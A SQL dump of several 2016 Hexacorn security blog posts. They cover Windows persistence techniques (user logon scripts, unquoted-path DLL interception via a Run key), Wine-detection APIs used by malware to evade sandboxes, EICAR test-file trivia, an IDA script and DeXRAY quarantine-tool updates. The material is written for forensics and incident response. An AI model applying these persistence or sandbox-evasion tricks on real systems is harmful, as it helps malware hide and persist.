INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (170, 'Permanent Link to Beyond good ol’ Run key, Part 38', 'Hexacorn', 'May 27, 2016 ', 'It’s been a while since my last post about persistence tricks. Today I decided to fix this and write about yet another trick – kinda old, yet still cool – that works even today despite being as old as Windows NT.\nThe userinit.exe process was featured in a number of persistence posts before (here , here and here). Turns out, we have not given it all the attention it needs yet.\nWhen you add a new user to the system, you have an option to change some properties of the user account as shown on the below screenshot. One of these properties is responsible for loading the user logon script (I named it foobar123.bat on the test system).\n\nThe alternative to GUI is using the following command:\n\n\nnet user /scriptpath:<Relative Path>\n\n\nOnce added to the user properties, the script will be executed anytime user logs on:\n\nYou may be wondering where on the system it has to be placed to ensure it is executed.\nThere are two places:\n\nYou can place it on Netlogon share:\n\neither the real one from the domain controller (where all user scripts reside),\nor\nyou can create a fake, local one by using the trick shown below:\n\n\n\n\nIn such case the script will be loaded like this:\n\n\nYou can place it inside the %systemroot%\\System32\\Repl\\Import\\Scripts directory\n\nIn such case it will be executed like this:\nIf you use net user command, the relative path is relative to %systemroot%\\System32\\Repl\\Import\\Scripts.\nThis trick is not my idea and is described in various places on the internet – I shamelessly ‘borrowed’ most of the bits and ideas from here.\nShare this :)', 'Anti-Forensics, Autostart (Persistence), Compromise Detection, Forensic Analysis, Incident Response', 'http://www.hexacorn.com/blog/2016/05/27/beyond-good-ol-run-key-part-38/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (171, 'Permanent Link to Creating IDT/IDS files for IDA from MS libraries with symbols', 'Hexacorn', 'April 22, 2016 ', 'In a reversing world it is a regular experience to come across samples that are linked to OS APIs that are imported from well-known libraries. However, on occasion we can come across files that use importing in a slightly different way – they import not via names but via ordinals. A good example are samples linking to MFC libraries.\nWhen loaded into IDA, such samples contain lots of autogenerated function names f.ex. mfc_1234. This is pretty annoying. Of course (and luckily) there exists a lot descriptions and solutions to it – we need an IDT or an IDS file. An IDT (or its compressed version IDS) file is a ‘translator’ between ordinal numbers and actual API names – many of these exist in a default installation package of IDA, but not all… One can generate these by hand – using existing scripts – and in case the MS symbols exist for a given library – one can try to generate these automagically using a simple script I am attaching to this post.\nThis is the recipe:\n\nEnsure your IDA is set up to use symbols from Microsoft\nOpen the MS library you analyze\nLoad its symbols from the MS web site (you are either asked, or they are loaded automatically – depends on your config)\nWhen the database is fully loaded and autoanalysis is completed, launch the following script:\n\nimport idaapi\r\nimport idc\r\nimport types\r\nimport os\r\n\r\nidt = GetIdbPath()\r\n\r\nprint \"Original IDB: %s\" % idt\r\n\r\nidt = idt.replace(\'.idb\',\'.idt\')\r\nidt = idt.replace(\'.i64\',\'.idt\')\r\n\r\ndll = GetInputFile()\r\n\r\nprint \"Saving to %s\" % idt\r\n\r\nf = open(idt, \'wb\')\r\nf.write(\"0 Name=%s\\n\" % (dll))\r\nfor i in xrange(idaapi.get_entry_qty()):\r\n    fn = idaapi.getn_func(i)\r\n    a = fn.startEA\r\n    if a != BADADDR:\r\n       eo = GetEntryOrdinal(i)\r\n       nm = GetFunctionName(GetEntryPoint(eo))\r\n       #cm = GetFunctionCmt(a,0)\r\n       #print \"%x: %0d, %s, %s\" %  (a,eo,nm,cm)\r\n       if nm!=\'\':\r\n          f.write(\"%d Name=%s\\n\" % (eo,nm))\r\nf.close()\r\nprint \"done!\"\n\nNow you should have the IDT file autogenerated in the same directory where the library is f.ex.\n\nmfcXYZ.idb\nmfcXYZ.idt  — this is the IDT file\n\n\nYou can now\n\nOpen sample linking to the MS library via ordinals\nLoad newly created IDT file\nAll mfc_1234 function names should be automatically converted to respective function/method names\n\n\nYou can also use zipids.exe to convert IDT file to IDS, but it’s not necessary\n\nShare this :)', 'Malware Analysis, Reversing, Software Releases', 'http://www.hexacorn.com/blog/2016/04/22/creating-idtids-files-for-ida-from-ms-libraries-with-symbols/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (172, 'Permanent Link to A few things about EICAR that you may be not aware of…', 'Hexacorn', 'April 10, 2016 ', 'Update April 2017\nAs per info from Vess, the programmer who was responsible responsible for writing the EICAR file was Padgett Peterson.\nIf you get excited about EICAR file making the news as being able to make AV deleting logs when EICAR is used as a user name, password, User agent, etc. – it’s old news  Read the history of the file including first attempts to abuse it here.\nOld Post\nWhen my wife studied her MA in graphic design and branding she got a lot of interesting home work. One of them was… ‘The square’. She spent a lot of time brainstorming and eventually produced a large collection of ideas that got her a good mark. Now, the simple purpose of that exercise was to play around with the idea of… ideas. As simple as it sounds, the moment you start exploring one ‘simple’ subject you will soon find yourself deep in a forest.\nAs I am adding support for many Quarantine files now (to DeXRAY) I suddenly found myself in a world of Antivirus analysis. One thing that somehow connects all of AV products is not their functionality, or Utopian vision of full protection, but… the EICAR file.\nI decided to explore the topic of this file a bit – same as my wife was exploring the square. Yup, here’s a boring story SLASH a bunch of ideas associated with EICAR SLASH and other topics like this …\nFirst of all – in case you don’t know – EICAR is a small file that is used as a test for security products (in the past it was mainly antivirus, but nowadays it should apply to any security solution that looks at files/content of any sort really). Once you deploy/install the solution/product, you can drop the EICAR file all over the place and see if solution picks it up. Notably, some AV vendors apparently do not understand what EICAR’s purpose is and decided not to detect it. I won’t be pointing fingers, but upload EICAR file to VirusTotal and you will know who I am talking about.\nNaming conventions in AV is a subject to many debates over many years. EICAR looks like a no-brainer though as it’s an artificial file created with a single purpose and its origin and name are well-documented. It doesn’t help though… it would seem that vendors can’t agree on one, single name. Here is a histogram of names used by AV:\nEICAR_test_file                  11\r\nEICAR-Test-File                   7\r\nEICAR-Test-File (not a virus)     4\r\nEicar test file                   3\r\nEICAR (v)                         2\r\nEicar-Test-Signature              2\r\nEICAR.Test.File                   2\r\nEICAR.TestFile                    2\r\nEICAR Test File (NOT a Virus!)    1\r\nEICAR.TEST.NOT-A-VIRUS            1\r\nEICAR-Test-File (not a virus) (B) 1\r\nEICAR Test String                 1\r\nDOS.EiracA.Trojan                 1\r\nMarker.Dos.EICAR.dymlmx           1\r\nEICAR.Test.File-NoVirus           1\r\nNORMAL:EICAR-Test-File!84776 [F]  1\r\nEICAR-Test-File!c                 1\r\nEICAR Test-NOT virus!!!           1\r\nWin32.Test.Eicar.a                1\r\nMisc.Eicar-Test-File              1\r\nEICAR_Test                        1\r\nNotAThreat.EICAR[TestFile]        1\r\nqex.eicar.gen.gen                 1\r\nTestFile/Win32.EICAR              1\r\nVirus:DOS/EICAR_Test_File         1\r\nEICAR-AV-Test                     1\r\nEICAR-AV-TEST-FILE                1\r\nEICAR-test[h]                     1\nAnd the bonus: one of these even has a typo. Can you spot it?\nEICAR is a very strange phenomenon.\nIt is an organization. It is a file. It has a dedicated web site. It haz a dedicated con. Its original name is inclusive of Europe, and exclusive of other continents (EICAR stands for ‘European Institute for Computer Antivirus Research’; deprecated name, but always…).\nAnagrams of EICAR are ERICA, CERIA and AREIC. They serve no purpose in this article.\nProperties:\nFile size: 68 bytes\r\nMD5: 44D88612FEA8A8F36DE82E1278ABB02F\r\nSHA1: 3395856CE81F2B7382DEE72602F798B642F14140\r\nSHA256: 275A021BBFB6489E54D471899F7DB9D1663FC695EC2FE2A2C4538AABF651FD0F\r\nCTPH: 3:a+JraNvsgzsVqSwHq9:tJuOgzsko\r\nEntropy: 4.872327687\nEicar is a DOS file and can be executed… but only under old versions of Windows.\n\nThe source code is using the same tricks as shellcodes:\n\ncode is obfuscated\n\n\n\nit is a self-modifying code (patching itself)\n\n\n\nDoes your sandbox solution accept EICAR? Test it.\nThere exist tools that help you to generate EICAR file and its cousins (file formats embedding EICAR).\nThere exist a close friend of EICAR called AMTSO (Anti-Malware Testing Standards Organization) that focuses on testing antimalware methods. It produces some more test files to support the original idea introduced by EICAR f.ex. Potentially Unwanted Application equivalent of EICAR:\n\nwith the histogram of detection names as follows (VT detection rate: 43/56 – mind you that the file was compiled on 2013-04-04 21:26:07 (Thursday)):\nApplication.Hacktool.Amtso.A                             5\r\nRiskware ( 0040eff71 )                                   2\r\nAMTSO-Test                                               2\r\nPUA_Test_File                                            2\r\nRiskTool.EICAR-Test-File.r5 (Not a Virus)                1\r\nRiskWare[RiskTool:not-a-virus]/Win32.EICAR-Test-File     1\r\nRiskTool.Win32.AMTSOTestFile (not malicious)             1\r\nAmtso.Test.Pua.A                                         1\r\nW32/PUAtest.B                                            1\r\nAMTSO_PUA_TEST                                           1\r\nRiskTool.Win32!O                                         1\r\nApplication.Win32.AmtsoTest.a                            1\r\nRiskware.AMTSO-Test-PUA                                  1\r\nApplication/AMTSOPUPTestfile                             1\r\nTrojan.Staser.gen                                        1\r\nApplication:W32/AMTSOPUATestfile                         1\r\nW32/TestFile.LCMA-1046                                   1\r\nBackdoor.CPEX.Win32.29390                                1\r\nRisktool.W32.Eicar.Test!c                                1\r\nHacktool.Win32.EICAR-Test-File.aa                        1\r\nRiskTool.Win32.AMTSOTestFile                             1\r\nnot-a-virus:RiskTool.Win32.EICAR-Test-File               1\r\nAMTSO-PUA-Test                                           1\r\nPE:Malware.Generic/QRS!1.9E2D [F]                        1\r\nRiskware.Win32.EICARTestFile.dmxhvk                      1\r\nPUA.AMTSOTest                                            1\r\nSpyCar                                                   1\r\nPUA/AMTSO-Test                                           1\r\nTrojan/W32.Agent.33280.TI                                1\r\nWin32/PUAtest.B potentially unwanted                     1\r\nW32/TestFile                                             1\r\nWin32:AmtsoTest-A [PUP]                                  1\r\nAMTSO-PUA-Test (PUA)                                     1\r\nRiskTool.EICAR-Test-File.a                               1\r\nAMTSO Test File PUA (Not a Virus!)                       1\r\nPUP/Win32.AMTSO_Test                                     1\n…and the cloudish EICAR file as well. Here’s the histogram of names given to the cloudish EICAR file (only 23/56 vendors detect it on VT; compilation date:  2010-07-08 23:02:46 (Thursday), ouch!):\nAMTSO_TEST_CLOUDCAR                    2\r\nCldcar-Test!3FB121FBBCCB               2\r\nTrojan.Win32.Generic!BT                2\r\nTrojan.Agent/Gen-CloudTest             1\r\nVirus:DOS/EICAR_Test_File              1\r\nTrojan.Generic                         1\r\nApplication.Win32.CloudTest.s          1\r\nWin.Trojan.11584714-1                  1\r\nAmtso.Test.Cloudcar.A                  1\r\nTrojan.Brodcom.Win32.366               1\r\nTrojan.Win32.DangerousObject.dlgbhn    1\r\nAMTSO-CLOUD-Test                       1\r\nTrojan.Win32.Z.Agent.7178[h]           1\r\nCLOUDCAR_Test                          1\r\nUDS:DangerousObject.Multi.Generic      1\r\nDangerousObject.Multi.Generic!c        1\r\nW32/GenBl.3FB121FB!Olympus             1\r\nMal/Generic-S                          1\r\nAMTSO Test File (NOT a Virus!)         1\r\nTrj/CI.A                               1\nThere also exist a close friend fo EICAR called GTUBE (Generic Test for Unsolicited Bulk Email) for testing anti-spam solutions. It is also 68 bytes long.\nLast, but not least – there exists a shorter version of EICAR and it is 12 bytes SHORTER than the original!\nThe Base64-encoded EICAR looks like this:\nWDVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JDIDYOUSPOTTHISEVJQ0FSLVNUQU5EQVJELUFOVElWSVJVUy1URVNU\r\nLUZJTEUhJEgrSCo=\nYou may come across it as it is being used in various tests and… it is a method used by Esafe to save Quarantine files. And… maybe you can’t read this post in case your security product is over protective and detected the BASE64-encoded EICAR string. Well, if it does… it shouldn’t, as I included ‘DIDYOUSPOTTHIS’ in the BASE64 encoding above. Well, did you spot that DIDYOUSPOTTHIS?\nEICAR is a tool. I use it to test Quarantine files’ encryption. When I find no encryption, or trivial encryption/encoding – I love EICAR. When I have to dig into some actual code to find out how they transform the original EICAR bytes into sth terrible I absolutely hate this little piece of hybrid data/code ;).\nShare this :)', 'Incident Response, Malware Analysis, Others, Preaching, Puzzles, Security Control, Silly', 'http://www.hexacorn.com/blog/2016/04/10/a-few-things-about-eicar-that-you-may-be-not-aware-of/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (173, 'Permanent Link to DeXRAY – Twentin Quarantino', 'Hexacorn', 'April 6, 2016 ', 'DeXRAY now supports over twenty Quarantine filetypes. I set a goal to look at one AV per day, unless I am busy with other stuff. So far, the results are kinda predictable: the most difficult to access with a debugger / crack / analyze are Chinese, Russian, and… Microsoft. The rest of the files took between 2 minutes to 2h of work max. It’s a great reversing experience as it’s heavily time-sensitive research (I want to crack it in one session), and at the same time I am learning about many pointers which I can use for further research and study. The guys @ProjectZero are unfortunately right. The moment you start looking at AV internals you discover lots of juicy stuff. Ouch. I strongly believe the AV is _needed_ in a current ‘open ecosystem’ setup existing in most of the companies, but it’s time AV vendors really review their code.\nAnyway…\nI have added support for Baidu .qv, CMC Antivirus *.cmc, and F-Prot .tmp Quarantine files. Confirmed Lavasoft AdAware  to be using BitDefender’s Quarantine files (.bdq), confirmed Comodo stores Quarantine files w/o encryption \nThe full list of supported or recognized file formats is listed below:\n\nAhnLab (V3B)\nASquared (EQF)\nAvast (Magic@0=’-chest- ‘)\nAvira (QUA)\nBaidu (QV)\nBitDefender (BDQ)\nCMC Antivirus (CMC)\nComodo <GUID> (not really; Quarantined files are not encrypted \nESET (NQF)\nF-Prot (TMP) (Magic@0=’KSS’)\nKaspersky (KLQ)\nLavasoft AdAware (BDQ) /BitDefender files really/\nMalwareBytes Data files (DATA)\nMalwareBytes Quarantine files (QUAR)\nMcAfee Quarantine files (BUP)\nMicrosoft Forefront|Defender (Magic@0=0B AD|D3 45) – not handled yet; only recognized\nPanda <GUID> Zip files\nSUPERAntiSpyware (SDB)\nSymantec Quarantine Data files (QBD)\nSymantec Quarantine files (VBN)\nSymantec Quarantine Index files (QBI)\nTrendMicro (Magic@0=A9 AC BD A7 which is ‘VSBX’ string ^ 0xFF)\nQuickHeal <hash> files\nVipre (<GUID>_ENC2)\nAny binary file (using X-RAY scanning)\n\nThe script can be downloaded here.\nShare this :)', 'Batch Analysis, DeXRAY, File Formats ZOO, Forensic Analysis, Incident Response, Malware Analysis, Re', 'http://www.hexacorn.com/blog/2016/04/06/dexray-twentin-quarantino/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (174, 'Permanent Link to DeXRAY – Quaranthon continues', 'Hexacorn', 'April 1, 2016 ', 'I have added support for QuickHeal <hash> Quarantine files.\nThe full list of supported or recognized file formats is listed below:\n\nAhnLab (V3B)\nASquared (EQF)\nAvast (Magic@0=’-chest- ‘)\nAvira (QUA)\nBitDefender (BDQ)\nESET (NQF)\nKaspersky (KLQ)\nMalwareBytes Data files (DATA)\nMalwareBytes Quarantine files (QUAR)\nMcAfee Quarantine files (BUP)\nMicrosoft Forefront|Defender (Magic@0=0B AD|D3 45) – not handled yet; only recognized\nPanda <GUID> Zip files\nSUPERAntiSpyware (SDB)\nSymantec Quarantine Data files (QBD)\nSymantec Quarantine files (VBN)\nSymantec Quarantine Index files (QBI)\nTrendMicro (Magic@0=A9 AC BD A7 which is ‘VSBX’ string ^ 0xFF)\nQuickHeal <hash> files\nVipre (<GUID>_ENC2)\nAny binary file (using X-RAY scanning)\n\nThe script can be downloaded here.\nShare this :)', 'Batch Analysis, Compromise Detection, DeXRAY, File Formats ZOO, Forensic Analysis, Incident Response', 'http://www.hexacorn.com/blog/2016/04/01/dexray-quaranthon-continues/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (175, 'Permanent Link to DeXRAY – one more', 'Hexacorn', 'March 31, 2016 ', 'I have added support for Panda <GUID> Quarantine files (both data and metadata).\nThe full list of supported or recognized file formats is listed below:\n\nAhnLab (V3B)\nASquared (EQF)\nAvast (Magic@0=’-chest- ‘)\nAvira (QUA)\nBitDefender (BDQ)\nESET (NQF)\nKaspersky (KLQ)\nMalwareBytes Data files (DATA)\nMalwareBytes Quarantine files (QUAR)\nMcAfee Quarantine files (BUP)\nMicrosoft Forefront|Defender (Magic@0=0B AD|D3 45) – not handled yet; only recognized\nPanda <GUID> Zip Files\nSUPERAntiSpyware (SDB)\nSymantec Quarantine Data files (QBD)\nSymantec Quarantine files (VBN)\nSymantec Quarantine Index files (QBI)\nTrendMicro (Magic@0=A9 AC BD A7 which is ‘VSBX’ string ^ 0xFF)\nVipre (<GUID>_ENC2)\nAny binary file (using X-RAY scanning)\n\nThe script can be downloaded here.\nShare this :)', 'Batch Analysis, Compromise Detection, DeXRAY, File Formats ZOO, Forensic Analysis, Incident Response', 'http://www.hexacorn.com/blog/2016/03/31/dexray-one-more/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (176, 'Permanent Link to DeXRAY – yet another update', 'Hexacorn', 'March 30, 2016 ', 'I have added support for AhnLab Quarantine files.\nThe full list of supported or recognized file formats is listed below:\n\nAhnLab (V3B)\nASquared (EQF)\nAvast (Magic@0=’-chest- ‘)\nAvira (QUA)\nBitDefender (BDQ)\nESET (NQF)\nKaspersky (KLQ)\nMalwareBytes Data files (DATA)\nMalwareBytes Quarantine files (QUAR)\nMcAfee Quarantine files (BUP)\nMicrosoft Forefront (Magic@0=0B AD) – not handled yet; only recognized\nSUPERAntiSpyware (SDB)\nSymantec Quarantine Data files (QBD)\nSymantec Quarantine files (VBN)\nSymantec Quarantine Index files (QBI)\nTrendMicro (Magic@0=A9 AC BD A7 which is ‘VSBX’ string ^ 0xFF)\nVipre (<GUID>_ENC2)\nAny binary file (using X-RAY scanning)\n\nThe script can be downloaded here.\nShare this :)', 'Batch Analysis, Compromise Detection, DeXRAY, File Formats ZOO, Forensic Analysis, Incident Response', 'http://www.hexacorn.com/blog/2016/03/30/dexray-yet-another-update/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (177, 'Permanent Link to DeXRAY – one more update', 'Hexacorn', 'March 28, 2016 ', 'I have added support for Avira, BitDefender and Vipre Quarantine files.\nThe full list of supported or recognized file formats is listed below:\n\nASquared (EQF)\nAvast (Magic@0=’-chest- ‘)\nAvira (QUA)\nBitDefender (BDQ)\nESET (NQF)\nKaspersky (KLQ)\nMalwareBytes Data files (DATA)\nMalwareBytes Quarantine files (QUAR)\nMcAfee Quarantine files (BUP)\nMicrosoft Forefront (Magic@0=0B AD) – not handled yet; only recognized\nSUPERAntiSpyware (SDB)\nSymantec Quarantine Data files (QBD)\nSymantec Quarantine files (VBN)\nSymantec Quarantine Index files (QBI)\nTrendMicro (Magic@0=A9 AC BD A7 which is ‘VSBX’ string ^ 0xFF)\nVipre (<GUID>_ENC2)\nAny binary file (using X-RAY scanning)\n\nThe script can be downloaded here.\nShare this :)', 'Batch Analysis, Compromise Detection, DeXRAY, File Formats ZOO, Forensic Analysis, Incident Response', 'http://www.hexacorn.com/blog/2016/03/28/dexray-one-more-update/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (178, 'Permanent Link to Detecting Wine via internal and legacy APIs', 'Hexacorn', 'March 27, 2016 ', 'Many malicious samples try to detect sandbox environment and to do so they use an avalanche of tricks that are either generic (f.ex. checking a number of processors) or very specific (f.ex. VMWare backdoor). One of the environments they try to detect using specific tricks is Wine.\nThe Wine detection is simple: check if kernel32.dll or ntdll.dll exports one of internal Wine APIs.\nLooking at the data obtained from sandboxing of many samples, I noticed that the combos (not necessarily correct) that are used to detect the Wine environment are as follows:\n\nkernel32.dll!wine_get_unix_file_name\nntdll.dll!wine_get_unix_file_name\nntdll.dll!wine_get_version\nntdll.dll!wine_nt_to_unix_file_name\nntdll.dll!wine_server_call\n\nThis made me think that there may be more possibilities and to confirm that I downloaded the latest snapshot of Wine source code.\nTurns out that there are actually more internal functions available.\nGrepping all *.spec files for the ‘# Wine.*?extensions’ regex gives us the following list of candidates:\ndlls\\gdi32\\gdi32.spec\n################################################################\r\n# Wine extensions: Win16 functions that are needed by other dlls\r\n#\r\n@ stdcall GetDCHook(long ptr)\r\n@ stdcall SetDCHook(long ptr long)\r\n@ stdcall SetHookFlags(long long)\r\n\r\n################################################################\r\n# Wine internal extensions\r\n#\r\n# All functions must be prefixed with \'__wine_\' (for internal functions)\r\n# or \'wine_\' (for user-visible functions) to avoid namespace conflicts.\r\n\r\n# GDI objects\r\n@ cdecl __wine_make_gdi_object_system(long long)\r\n@ cdecl __wine_set_visible_region(long long ptr ptr ptr)\r\n\r\n# Graphics drivers\r\n@ cdecl __wine_set_display_driver(long)\r\n\r\n# OpenGL\r\n@ cdecl __wine_get_wgl_driver(long long)\ndlls\\imm32\\imm32.spec\n################################################################\r\n# Wine internal extensions\r\n@ stdcall __wine_get_ui_window(ptr)\ndlls\\kernel32\\kernel32.spec\n################################################################\r\n# Wine internal extensions\r\n#\r\n# All functions must be prefixed with \'__wine_\' (for internal functions)\r\n# or \'wine_\' (for user-visible functions) to avoid namespace conflicts.\r\n\r\n# 16-bit relays (for backwards compatibility)\r\n@ cdecl -i386 -private __wine_dll_register_16(ptr str)\r\n@ cdecl -i386 -private __wine_dll_unregister_16(ptr)\r\n@ stub -i386 __wine_call_from_16_regs\r\n\r\n# Unix files\r\n@ cdecl wine_get_unix_file_name(wstr)\r\n@ cdecl wine_get_dos_file_name(str)\r\n\r\n# Init code\r\n@ cdecl __wine_kernel_init()\ndlls\\krnl386.exe16\\krnl386.exe16.spec\n################################################################\r\n# Wine internal extensions\r\n#\r\n# All functions must be prefixed with \'__wine_\' (for internal functions)\r\n# or \'wine_\' (for user-visible functions) to avoid namespace conflicts.\r\n\r\n# DOS support\r\n@ cdecl -arch=win32 __wine_call_int_handler(ptr long)\r\n@ cdecl -arch=win32 __wine_load_dos_exe(str str)\r\n\r\n# VxDs\r\n@ cdecl -arch=win32 -private __wine_vxd_open(wstr long ptr)\r\n@ cdecl -arch=win32 -private __wine_vxd_get_proc(long)\ndlls\\ntdll\\ntdll.spec\n##################\r\n# Wine extensions\r\n#\r\n# All functions must be prefixed with \'__wine_\' (for internal functions)\r\n# or \'wine_\' (for user-visible functions) to avoid namespace conflicts.\r\n\r\n# Relays\r\n@ cdecl -i386 __wine_enter_vm86(ptr)\r\n\r\n# Server interface\r\n@ cdecl -norelay wine_server_call(ptr)\r\n@ cdecl wine_server_fd_to_handle(long long long ptr)\r\n@ cdecl wine_server_handle_to_fd(long long ptr ptr)\r\n@ cdecl wine_server_release_fd(long long)\r\n@ cdecl wine_server_send_fd(long)\r\n@ cdecl __wine_make_process_system()\r\n\r\n# Version\r\n@ cdecl wine_get_version() NTDLL_wine_get_version\r\n@ cdecl wine_get_build_id() NTDLL_wine_get_build_id\r\n@ cdecl wine_get_host_version(ptr ptr) NTDLL_wine_get_host_version\r\n\r\n# Codepages\r\n@ cdecl __wine_init_codepages(ptr ptr ptr)\r\n\r\n# signal handling\r\n@ cdecl __wine_set_signal_handler(long ptr)\r\n\r\n# Filesystem\r\n@ cdecl wine_nt_to_unix_file_name(ptr ptr long long)\r\n@ cdecl wine_unix_to_nt_file_name(ptr ptr)\r\n@ cdecl __wine_init_windows_dir(wstr wstr)\ndlls\\ntoskrnl.exe\\ntoskrnl.exe.spec\n################################################################\r\n# Wine internal extensions\r\n#\r\n# All functions must be prefixed with \'__wine_\' (for internal functions)\r\n# or \'wine_\' (for user-visible functions) to avoid namespace conflicts.\r\n\r\n@ cdecl wine_ntoskrnl_main_loop(long)\ndlls\\user32\\user32.spec\n################################################################\r\n# Wine internal extensions\r\n#\r\n# All functions must be prefixed with \'__wine_\' (for internal functions)\r\n# or \'wine_\' (for user-visible functions) to avoid namespace conflicts.\r\n#\r\n@ cdecl __wine_send_input(long ptr)\r\n@ cdecl __wine_set_pixel_format(long long)\nNow that we have a list of all internal functions, we can create a simple program that will try to detect Wine by attempting to resolve these API names.\nRunning it on Win7 we get the following results:\n\nRunning it on Wine under Ubuntu gives us the following result:\n\nSo, it looks like we have quite a lot of combos to use!\n\nkernel32.dll!__wine_dll_register_16\nkernel32.dll!__wine_dll_unregister_16\nkernel32.dll!__wine_call_from_16_regs\nkernel32.dll!wine_get_unix_file_name\nkernel32.dll!wine_get_dos_file_name\nkernel32.dll!__wine_kernel_init\nntdll.dll!__wine_enter_vm86\nntdll.dll!wine_server_call\nntdll.dll!wine_server_fd_to_handle\nntdll.dll!wine_server_handle_to_fd\nntdll.dll!wine_server_release_fd\nntdll.dll!wine_server_send_fd\nntdll.dll!__wine_make_process_system\nntdll.dll!wine_get_version\nntdll.dll!wine_get_build_id\nntdll.dll!wine_get_host_version\nntdll.dll!__wine_init_codepages\nntdll.dll!__wine_set_signal_handler\nntdll.dll!wine_nt_to_unix_file_name\nntdll.dll!wine_unix_to_nt_file_name\nntdll.dll!__wine_init_windows_dir\n\nThe title of this post refers to both internal and legacy APIs.\nHere’s a thing – there exist APIs that used to be present in the old versions of Windows but have been removed and are no longer exported by the OS libraries. Yet, Wine continues to offer them as an export – most likely for compatibility reasons.\nA perfect example of such API are RegisterServiceProcess and OpenVxDHandle that used to be exported by kernel32.dll on Windows 9x/ME, but are not present on the NT/2000/XP/Vista/Win7/8/10.\nYup. This fact alone allows us to leverage them for the detection of Wine (and potentially other sandboxes).\n\nThis is obviously a tip of an iceberg – many other APIs like this can be found all over the place.\nYou can download the test tool here.\nShare this :)', 'Anti-*, Batch Analysis, Malware Analysis, Sandboxing', 'http://www.hexacorn.com/blog/2016/03/27/detecting-wine-via-internal-and-legacy-apis/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (179, 'Permanent Link to Beyond good ol’ Run key, Part 37', 'Hexacorn', 'March 26, 2016 ', 'The technique I will describe today is extremely old and well-known yet I don’t recall writing about it in detail and would probably forget about it completely if not for Nick who pinged me about it a whiiiiiiiile ago  Thanks Nick!\nThe path interception is a vulnerability type which is abused by both malware and pentesters. The most common example of this vulnerability on Windows platform relies on dropping “c:\\program.exe” and waiting for a service or other application to be launched from a path that was not quoted. When quotes are not used the given path is traversed and anytime a blank character is encountered the OS will attempt to execute any program that happens to be matching the substring being part of the traversed path.  Sounds complicated.\nIn other words.\n\n“C:\\program Files\\foo bar\\file.exe”\n\nis not equal to\n\nC:\\program Files\\foo bar\\file.exe\n\nIn a first case, the path is given in a precise way with no room for error. OS will attempt to launch only one program.\nIn a second, the OS will attempt to launch:\n\nC:\\program.exe\n\nfirst, then:\n\nC:\\program Files\\foo.exe\n\nand eventually:\n\nC:\\program Files\\foo bar\\file.exe\n\nNowadays users can’t freely write to these paths, so to leverage it one needs to explore all the existing autostart locations on the system and find a combo of both an unquoted path + a writable directory that enable the exploit to work.\nIt’s a simple, yet powerful way not only to gain persistence, but in some cases to elevate privileges as well.\nA DLL variant of this vulnerability can rely on adding a new startup entry (or leveraging an existing one) that would point to clean components only (f.ex. a clean rundll32.exe loading an existing, clean system DLL).\nLet’s look at an example – we could add something like this to HKCU\\…\\Run:\n\nrundll32.exe c:\\Program Files\\Internet Explorer\\ieproxy.dll\n\nand then drop:\n\nc:\\Program.dll\n\nor\n\nc:\\Program Files\\Internet.dll\n\nwhich rundll32.exe would then hopefully load for us.\nThere is a little caveat though, the rundll32.exe checks if the second token (obtained by splitting the command line arguments using blank characters as a delimiter – and in our case ‘Files\\Internet.dll’) contains a path separator character (‘\\’, or ‘/’). If it does, rundll32 assumes it is an incorrect command line and exits. So, the above example doesn’t work.\nTo bypass it, one could use a root path with more than one space. The old folder name ‘C:\\Document and Settings’ works perfectly here, but it is a legacy path that may not be the best choice for new systems. For these systems (and since most of new computers are now 64-bit) we can use ‘c:\\Program Files (x86)’ (first token: ‘c:\\Program’, second token: ‘Files’).\nIf you see a string like the below in the Registry under HKCU\\…\\RUN:\n\n“C:\\Windows\\System32\\rundll32.exe” c:\\Program Files\\Internet Explorer\\ieproxy.dll\n\nit may not raise the immediate suspicion. The real-case scenario could go even further and use even more ambiguous path f.ex. one belonging to a graphic card, or a sound card.\nRunning the aforementioned entry from a command line will get you the following message:\n\nThis is because rundll32.exe attempts to load C:\\program.dll.\n\nAs such, dropping c:\\<DLL name exploiting path truncation>.dll will give you a lame persistence (lame, because you still need to either find an existing, or add a clean entry to a startup location + need to write to C:\\ drive – this could have worked 10 years ago, but not today  ).\nShare this :)', 'Anti-Forensics, Autostart (Persistence), Compromise Detection, Forensic Analysis, Incident Response,', 'http://www.hexacorn.com/blog/2016/03/26/beyond-good-ol-run-key-part-37/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (180, 'Permanent Link to DeXRAY – Update', 'Hexacorn', 'March 20, 2016 ', 'I got some time yesterday to look at Avast quarantined files and ended up adding support for them to DeXRAY.\nThe Avast Qurantined files are easy to recognize as they have the ‘-chest- ‘ signature at the top of each file:\nThe full list of supported or recognized file formats is listed below:\n\nASquared (EQF)\nAvast (Magic@0=’-chest- ‘)\nESET (NQF)\nKaspersky (KLQ) – based on the code by Optiv\nMalwareBytes Data files (DATA)\nMalwareBytes Quarantine files (QUAR)\nMcAfee Quarantine files (BUP) – not perfect, but it should still help\nMicrosoft Forefront (Magic@0=0B AD) – not handled yet; only recognized\nSUPERAntiSpyware (SDB)\nSymantec Quarantine Data files (QBD)\nSymantec Quarantine files (VBN) – not perfect, but it should still help\nSymantec Quarantine Index files (QBI)\nTrendMicro (Magic@0=A9 AC BD A7 which is ‘VSBX’ string ^ 0xFF) – based on the code by Optiv\nAny binary file (using X-RAY scanning)\n\nThe script can be downloaded here.\nShare this :)', 'Batch Analysis, Compromise Detection, DeXRAY, File Formats ZOO, Forensic Analysis, Incident Response', 'http://www.hexacorn.com/blog/2016/03/20/dexray-update/\n');
